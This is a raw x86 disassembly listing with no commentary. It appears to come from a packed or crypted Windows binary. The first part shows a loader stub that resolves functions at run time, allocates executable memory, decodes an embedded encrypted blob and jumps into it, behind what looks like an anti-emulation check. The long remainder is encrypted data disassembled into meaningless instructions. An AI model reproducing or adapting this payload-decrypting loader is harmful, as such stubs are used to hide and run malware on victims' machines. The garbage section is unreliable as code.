  4214af:	mul    BYTE PTR [edi+0x16d40d0a]
  4214b5:	push   0x80b3d89a
  4214ba:	or     BYTE PTR [ecx-0x5e],cl
  4214bd:	pop    ds
  4214be:	ret    
  4214bf:	cmp    eax,0x977c496b
  4214c4:	push   edx
  4214c5:	rcl    BYTE PTR [esi-0x3fcc352f],0xc3
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x3ff3e0e3
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x15b015c6
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	jmp    FWORD PTR [eax]
  42182f:	push   0xf28e0ea6
  421834:	sbb    DWORD PTR [edi+0x62],ecx
  421837:	dec    ecx
  421838:	jbe    0x421878
  42183a:	aaa    
  42183b:	call   0x19f2:0x8db63632
  421842:	dec    edi
  421843:	dec    cx
  421845:	jbe    0x4218c5
  421847:	enter  0x3265,0x36
  42184b:	push   cs
  42184c:	(bad)  
  42184d:	repnz sbb DWORD PTR [edi+0x66],ecx
  421851:	dec    ecx
  421852:	jbe    0x421892
  421854:	enter  0x3265,0x36
  421858:	push   cs
  421859:	(bad)  
  42185a:	repnz sbb DWORD PTR [edi+0x66],ecx
  42185e:	dec    ecx
  42185f:	jbe    0x42189f
  421861:	enter  0x3265,0x36
  421865:	push   cs
  421866:	(bad)  
  421867:	repnz sbb DWORD PTR [edi-0x62],ecx
  42186b:	dec    ecx
  42186c:	jbe    0x4218ac
  42186e:	(bad)  
  42186f:	jp     0x4217f9
  421871:	cmp    BYTE PTR [esi],cl
  421873:	cmp    ebx,edi
  421875:	aam    0x6e
  421877:	fimul  WORD PTR [eax+0x3a]
  42187a:	repz jmp 0x7da172b1
  421880:	lods   eax,DWORD PTR ds:[esi]
  421881:	sub    BYTE PTR [ebx+0x20],0x1
  421885:	cmp    edx,DWORD PTR [edi]
  421887:	push   ebx
  421888:	call   0x609a6b93
  42188d:	loop   0x421815
  42188f:	cmp    DWORD PTR ds:0x4b046903,ebp
  421895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421896:	inc    ebp
  421897:	pop    ebx
  421898:	pop    eax
  421899:	cs leave 
  42189b:	mov    ebp,0x260b6f4a
  4218a0:	adc    bl,BYTE PTR [ebx-0x1a]
  4218a3:	push   0x8d2a3c3f
  4218a8:	repnz sbb DWORD PTR [edi+0x66],ecx
  4218ac:	dec    ecx
  4218ad:	jbe    0x4218e8
  4218af:	push   ecx
  4218b0:	cdq    
  4218b1:	imul   esi,DWORD PTR [ebp-0xa],0x1f
  4218b5:	clc    
  4218b6:	pop    edx
  4218b7:	mov    bh,0xf4
  4218b9:	inc    ebx
  4218ba:	xor    eax,0x6a6f5ac6
  4218bf:	push   ebx
  4218c0:	add    al,BYTE PTR [edi+0x6cdde1ad]
  4218c6:	adc    DWORD PTR [ebx],edx
  4218c8:	push   es
  4218c9:	ret    0xcaa7
  4218cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218cd:	add    al,0xd5
  4218cf:	xchg   edi,eax
  4218d0:	and    BYTE PTR [ebp+0xe],al
  4218d3:	mov    cl,0xe4
  4218d5:	xor    al,0xe4
  4218d7:	jmp    0x4218e4
  4218d9:	cmp    al,0x48
  4218db:	jne    0x42193d
  4218dd:	adc    eax,DWORD PTR ds:0x747c58e6
  4218e3:	xor    bh,dh
  4218e5:	cmp    BYTE PTR [esi+ecx*4-0x74],bh
  4218e9:	clc    
  4218ea:	inc    ecx
  4218eb:	mov    bh,0xf4
  4218ed:	inc    ebx
  4218ee:	xor    eax,0x1a6f5bc6
  4218f3:	iret   
  4218f4:	pushf  
  4218f5:	xchg   DWORD PTR [ebp-0x3f],ecx
  4218f8:	iret   
  4218f9:	ins    BYTE PTR es:[edi],dx
  4218fa:	add    al,0x8e
  4218fc:	lods   al,BYTE PTR ds:[esi]
  4218fd:	ret    0x573d
  421900:	or     eax,DWORD PTR [eax*4+0x3e458b0a]
  421907:	sub    al,0x7e
  421909:	xor    al,0x8a
  42190b:	popf   
  42190c:	mov    al,ds:0xfde8563c
  421911:	adc    ecx,DWORD PTR ds:0x6c7cdb9e
  421917:	mov    eax,ds:0xf6755a06
  42191c:	pop    ds
  42191d:	clc    
  42191e:	sbb    DWORD PTR [edi+0x66],ecx
  421921:	dec    ecx
  421922:	jbe    0x421962
  421924:	enter  0x6265,0x73
  421928:	push   cs
  421929:	lea    edi,[esi-0x1699b2e8]
  42192f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421930:	push   ebp
  421931:	xchg   DWORD PTR [ebp+0x32],esp
  421934:	ss push cs
  421936:	(bad)  
  421937:	repnz sbb DWORD PTR [edi-0x7a],ecx
  42193b:	dec    ecx
  42193c:	jne    0x42197d
  42193e:	ret    
  42193f:	cmp    BYTE PTR fs:[esi],dh
  421942:	push   cs
  421943:	arpl   si,si
  421945:	sbb    DWORD PTR [edi-0x26],ecx
  421948:	dec    edi
  421949:	jbe    0x421989
  42194b:	enter  0x3265,0x27
  42194f:	mov    bl,0x8d
  421951:	repnz sbb DWORD PTR [edi+0x66],ebx
  421955:	dec    ecx
  421956:	jbe    0x421996
  421958:	int    0x65
  42195a:	xor    dh,BYTE PTR [esi]
  42195c:	dec    edi
  42195d:	(bad)  
  42195e:	repnz or DWORD PTR [edi+0x66],ecx
  421962:	dec    ecx
  421963:	je     0x4219a3
  421965:	enter  0x3260,0x37
  421969:	push   cs
  42196a:	(bad)  
  42196b:	repnz sbb DWORD PTR [edi+0x63],ecx
  42196f:	dec    ecx
  421970:	ja     0x4219b0
  421972:	enter  0x3265,0x36
  421976:	push   cs
  421977:	(bad)  
  421979:	sbb    DWORD PTR [edi+0x62],ecx
  42197c:	dec    ecx
  42197d:	jbe    0x4219be
  42197f:	sub    al,0x60
  421981:	xor    dh,BYTE PTR [esi+ecx*1]
  421984:	lea    esi,[edx+0x19]
  421987:	dec    edi
  421988:	jbe    0x4219d3
  42198a:	jbe    0x4219ba
  42198c:	enter  0x3265,0x36
  421990:	push   ds
  421991:	(bad)  
  421992:	repnz or DWORD PTR [edi+0x66],ecx
  421996:	dec    ecx
  421997:	jbe    0x4219d7
  421999:	enter  0x3275,0x36
  42199d:	push   cs
  42199e:	(bad)  
  42199f:	repnz sbb DWORD PTR [edi+0x66],ecx
  4219a3:	dec    ecx
  4219a4:	jbe    0x4219e4
  4219a6:	cmp    al,0x5c
  4219a8:	ds ss addr16 mov ?,edx
  4219ad:	sbb    DWORD PTR [edi-0x6a],ecx
  4219b0:	inc    edx
  4219b1:	jbe    0x421a24
  4219b3:	and    DWORD PTR [ebp+0x32],0xf28d0e36
  4219ba:	sbb    DWORD PTR [edi+0x66],ecx
  4219bd:	dec    ecx
  4219be:	jbe    0x4219fe
  4219c0:	enter  0x3265,0x36
  4219c4:	push   cs
  4219c5:	(bad)  
  4219c6:	repnz sbb DWORD PTR [edi+0x66],ecx
  4219ca:	dec    ecx
  4219cb:	jbe    0x421a0b
  4219cd:	enter  0x3265,0x36
  4219d1:	push   cs
  4219d2:	(bad)  
  4219d3:	repnz sbb DWORD PTR [edi+0x66],ecx
  4219d7:	dec    ecx
  4219d8:	jbe    0x421a18
  4219da:	enter  0x3265,0x36
  4219de:	push   cs
  4219df:	(bad)  
  4219e0:	repnz sbb DWORD PTR [edi+0x66],ecx
  4219e4:	dec    ecx
  4219e5:	jbe    0x421a25
  4219e7:	enter  0x3265,0x36
  4219eb:	push   cs
  4219ec:	(bad)  
  4219ed:	repnz sbb DWORD PTR [edi+0x66],ecx
  4219f1:	dec    ecx
  4219f2:	jbe    0x421a32
  4219f4:	enter  0x3265,0x36
  4219f8:	push   cs
  4219f9:	(bad)  
  4219fa:	repnz sbb DWORD PTR [edi+0x66],ecx
  4219fe:	dec    ecx
  4219ff:	jbe    0x421a3f
  421a01:	enter  0x3265,0x36
  421a05:	push   cs
  421a06:	(bad)  
  421a07:	repnz sbb DWORD PTR [edi+0x66],ecx
  421a0b:	dec    ecx
  421a0c:	jbe    0x421a4c
  421a0e:	enter  0x3265,0x36
  421a12:	push   cs
  421a13:	(bad)  
  421a14:	repnz sbb DWORD PTR [edi+0x66],ecx
  421a18:	dec    ecx
  421a19:	jbe    0x421a59
  421a1b:	enter  0x3265,0x18
  421a1f:	jp     0x421a09
  421a21:	mov    ch,BYTE PTR [ebp+0x4f]
  421a24:	dec    cx
  421a26:	jbe    0x421a06
  421a28:	ret    
  421a29:	xor    ah,BYTE PTR gs:[esi]
  421a2c:	push   cs
  421a2d:	(bad)  
  421a2e:	repnz int 0x4b
  421a31:	dec    cx
  421a33:	jb     0x421a73
  421a35:	enter  0x7735,0x75
  421a39:	cmp    al,0xd9
  421a3b:	mov    ebp,0x49664f19
  421a40:	jbe    0x421a80
  421a42:	call   0x21184cac
  421a47:	inc    DWORD PTR [ecx+0x49662c6b]
  421a4d:	jbe    0x421a8d
  421a4f:	test   al,0x65
  421a51:	xor    dh,BYTE PTR [esi]
  421a53:	inc    BYTE PTR [esi+0x661519f2]
  421a59:	dec    ecx
  421a5a:	jbe    0x421a42
  421a5c:	int3   
  421a5d:	xor    dh,BYTE PTR gs:[esi]
  421a60:	push   cs
  421a61:	(bad)  
  421a62:	repnz sbb DWORD PTR [edi+0x66],ecx
  421a66:	dec    ecx
  421a67:	jbe    0x421aa7
  421a69:	enter  0x3245,0x36
  421a6d:	out    dx,al
  421a6e:	(bad)  
  421a6f:	repnz sbb DWORD PTR [edi+0x66],ecx
  421a73:	dec    ecx
  421a74:	jbe    0x421ab4
  421a76:	enter  0x3265,0x36
  421a7a:	push   cs
  421a7b:	(bad)  
  421a7c:	repnz sbb DWORD PTR [edi+0x66],ecx
  421a80:	dec    ecx
  421a81:	jbe    0x421ac1
  421a83:	enter  0x3265,0x36
  421a87:	push   cs
  421a88:	(bad)  
  421a89:	repnz sbb DWORD PTR [edi+0x66],ecx
  421a8d:	dec    ecx
  421a8e:	jbe    0x421ace
  421a90:	enter  0x3265,0x36
  421a94:	push   cs
  421a95:	(bad)  
  421a96:	repnz sbb DWORD PTR [edi+0x66],ecx
  421a9a:	dec    ecx
  421a9b:	jbe    0x421adb
  421a9d:	enter  0x3265,0x36
  421aa1:	push   cs
  421aa2:	(bad)  
  421aa3:	repnz sbb DWORD PTR [edi+0x66],ecx
  421aa7:	dec    ecx
  421aa8:	jbe    0x421ae8
  421aaa:	enter  0x3265,0x36
  421aae:	push   cs
  421aaf:	(bad)  
  421ab0:	repnz sbb DWORD PTR [edi+0x66],ecx
  421ab4:	dec    ecx
  421ab5:	jbe    0x421af5
  421ab7:	enter  0x3265,0x36
  421abb:	push   cs
  421abc:	(bad)  
  421abd:	repnz sbb DWORD PTR [edi+0x66],ecx
  421ac1:	dec    ecx
  421ac2:	jbe    0x421b02
  421ac4:	enter  0x3265,0x36
  421ac8:	push   cs
  421ac9:	(bad)  
  421aca:	repnz sbb DWORD PTR [edi+0x66],ecx
  421ace:	dec    ecx
  421acf:	jbe    0x421b0f
  421ad1:	enter  0x3265,0x36
  421ad5:	push   cs
  421ad6:	(bad)  
  421ad7:	repnz sbb DWORD PTR [edi+0x66],ecx
  421adb:	dec    ecx
  421adc:	jbe    0x421b1c
  421ade:	enter  0x3265,0x36
  421ae2:	push   cs
  421ae3:	(bad)  
  421ae4:	repnz sbb DWORD PTR [edi+0x66],ecx
  421ae8:	dec    ecx
  421ae9:	jbe    0x421b29
  421aeb:	enter  0x3265,0x36
  421aef:	push   cs
  421af0:	(bad)  
  421af1:	repnz sbb DWORD PTR [edi+0x66],ecx
  421af5:	dec    ecx
  421af6:	jbe    0x421b36
  421af8:	enter  0x3265,0x36
  421afc:	push   cs
  421afd:	(bad)  
  421afe:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b02:	dec    ecx
  421b03:	jbe    0x421b43
  421b05:	enter  0x3265,0x36
  421b09:	push   cs
  421b0a:	(bad)  
  421b0b:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b0f:	dec    ecx
  421b10:	jbe    0x421b50
  421b12:	enter  0x3265,0x36
  421b16:	push   cs
  421b17:	(bad)  
  421b18:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b1c:	dec    ecx
  421b1d:	jbe    0x421b5d
  421b1f:	enter  0x3265,0x36
  421b23:	push   cs
  421b24:	(bad)  
  421b25:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b29:	dec    ecx
  421b2a:	jbe    0x421b6a
  421b2c:	enter  0x3265,0x36
  421b30:	push   cs
  421b31:	(bad)  
  421b32:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b36:	dec    ecx
  421b37:	jbe    0x421b77
  421b39:	enter  0x3265,0x36
  421b3d:	push   cs
  421b3e:	(bad)  
  421b3f:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b43:	dec    ecx
  421b44:	jbe    0x421b84
  421b46:	enter  0x3265,0x36
  421b4a:	push   cs
  421b4b:	(bad)  
  421b4c:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b50:	dec    ecx
  421b51:	jbe    0x421b91
  421b53:	enter  0x3265,0x36
  421b57:	push   cs
  421b58:	(bad)  
  421b59:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b5d:	dec    ecx
  421b5e:	jbe    0x421b9e
  421b60:	enter  0x3265,0x36
  421b64:	push   cs
  421b65:	(bad)  
  421b66:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b6a:	dec    ecx
  421b6b:	jbe    0x421bab
  421b6d:	enter  0x3265,0x36
  421b71:	push   cs
  421b72:	(bad)  
  421b73:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b77:	dec    ecx
  421b78:	jbe    0x421bb8
  421b7a:	enter  0x3265,0x36
  421b7e:	push   cs
  421b7f:	(bad)  
  421b80:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b84:	dec    ecx
  421b85:	jbe    0x421bc5
  421b87:	enter  0x3265,0x36
  421b8b:	push   cs
  421b8c:	(bad)  
  421b8d:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b91:	dec    ecx
  421b92:	jbe    0x421bd2
  421b94:	enter  0x3265,0x36
  421b98:	push   cs
  421b99:	(bad)  
  421b9a:	repnz sbb DWORD PTR [edi+0x66],ecx
  421b9e:	dec    ecx
  421b9f:	jbe    0x421bdf
  421ba1:	enter  0x3265,0x36
  421ba5:	push   cs
  421ba6:	(bad)  
  421ba7:	repnz sbb DWORD PTR [edi+0x66],ecx
  421bab:	dec    ecx
  421bac:	jbe    0x421bec
  421bae:	enter  0x3265,0x36
  421bb2:	push   cs
  421bb3:	(bad)  
  421bb4:	repnz sbb DWORD PTR [edi+0x66],ecx
  421bb8:	dec    ecx
  421bb9:	jbe    0x421bf9
  421bbb:	enter  0x3265,0x36
  421bbf:	push   cs
  421bc0:	(bad)  
  421bc1:	repnz sbb DWORD PTR [edi+0x66],ecx
  421bc5:	dec    ecx
  421bc6:	jbe    0x421c06
  421bc8:	enter  0x3265,0x36
  421bcc:	push   cs
  421bcd:	(bad)  
  421bce:	repnz sbb DWORD PTR [edi+0x66],ecx
  421bd2:	dec    ecx
  421bd3:	jbe    0x421c13
  421bd5:	enter  0x3265,0x36
  421bd9:	push   cs
  421bda:	(bad)  
  421bdb:	repnz sbb DWORD PTR [edi+0x66],ecx
  421bdf:	dec    ecx
  421be0:	jbe    0x421c20
  421be2:	enter  0x3265,0x36
  421be6:	push   cs
  421be7:	(bad)  
  421be8:	repnz sbb DWORD PTR [edi+0x66],ecx
  421bec:	dec    ecx
  421bed:	jbe    0x421c2d
  421bef:	enter  0x3265,0x36
  421bf3:	push   cs
  421bf4:	(bad)  
  421bf5:	repnz sbb DWORD PTR [edi+0x66],ecx
  421bf9:	dec    ecx
  421bfa:	jbe    0x421c3a
  421bfc:	enter  0x3265,0x36
  421c00:	push   cs
  421c01:	(bad)  
  421c02:	repnz sbb DWORD PTR [edi+0x66],ecx
  421c06:	dec    ecx
  421c07:	jbe    0x421c47
  421c09:	enter  0x3265,0x36
  421c0d:	push   cs
  421c0e:	(bad)  
  421c0f:	repnz sbb DWORD PTR [edi+0x66],ecx
  421c13:	dec    ecx
  421c14:	jbe    0x421c54
  421c16:	enter  0x3265,0x36
  421c1a:	push   cs
  421c1b:	(bad)  
  421c1c:	repnz sbb DWORD PTR [edi+0x66],ecx
  421c20:	dec    ecx
  421c21:	jbe    0x421c61
  421c23:	enter  0x3265,0x36
  421c27:	push   cs
  421c28:	(bad)  
  421c29:	repnz sbb DWORD PTR [edi+0x66],ecx
  421c2d:	dec    ecx
  421c2e:	sbb    DWORD PTR [esi+0x361d65c3],edx
  421c34:	push   cs
  421c35:	popf   
  421c36:	repnz sbb DWORD PTR [ebp-0x3c],esp
  421c3a:	xchg   ebx,eax
  421c3b:	pop    es
  421c3c:	pop    eax
  421c3d:	aaa    
  421c3e:	dec    eax
  421c3f:	lods   al,BYTE PTR ds:[esi]
  421c40:	mov    cl,0x5e
  421c42:	pusha  
  421c43:	(bad)  
  421c44:	icebp  
  421c45:	pop    esp
  421c46:	rcr    ah,cl
  421c48:	adc    BYTE PTR [edi+0x4c],cl
  421c4b:	aas    
  421c4c:	and    DWORD PTR [edi-0x2606447],eax
  421c52:	(bad)
  421c55:	pop    eax
  421c56:	pop    esp
  421c57:	pop    eax
  421c58:	pop    edx
  421c59:	or     eax,DWORD PTR ds:0x3be53c41
  421c5f:	dec    edi
  421c60:	inc    ecx
  421c61:	out    dx,al
  421c62:	(bad)  
  421c63:	imul   ebx,DWORD PTR [ecx+0x33049b08],0x50
  421c6a:	out    0xa8,al
  421c6c:	das    
  421c6d:	imul   edx,DWORD PTR [edi-0x497b7aae],0x13f619f7
  421c77:	clc    
  421c78:	imul   BYTE PTR [ebx]
  421c7a:	inc    esi
  421c7b:	jmp    0x4e77:0x4862cf79
  421c82:	dec    eax
  421c83:	fdiv   QWORD PTR [ecx+0x6020fed7]
  421c89:	or     esp,DWORD PTR [ebx+0x31d03f49]
  421c8f:	mov    edx,0xab72c10f
  421c94:	inc    edi
  421c95:	mov    ecx,0xc3a8b517
  421c9a:	es sbb ch,cl
  421c9d:	ficom  DWORD PTR es:[edx-0x58]
  421ca1:	pop    ecx
  421ca2:	jmp    0xdfbc7e14
  421ca7:	je     0x421c33
  421ca9:	jne    0x421c4f
  421cab:	mov    al,0x37
  421cad:	mov    al,0x57
  421caf:	js     0x421c6b
  421cb1:	mov    edi,eax
  421cb3:	or     edx,DWORD PTR [eax-0x75f4c98]
  421cb9:	pop    esp
  421cba:	mov    esi,ebx
  421cbc:	add    cl,bh
  421cbe:	or     eax,0xb14676ac
  421cc3:	es iret 
  421cc5:	scas   al,BYTE PTR es:[edi]
  421cc6:	lahf   
  421cc7:	repnz dec ebx
  421cc9:	mov    ebx,0x7d99b27c
  421cce:	xor    DWORD PTR [eax],0x302c7a1
  421cd4:	(bad)  
  421cd5:	es push es
  421cd7:	outs   dx,BYTE PTR ds:[esi]
  421cd8:	adc    bh,BYTE PTR [esi-0x71]
  421cdb:	mov    cl,BYTE PTR [edx+eiz*1+0x1b]
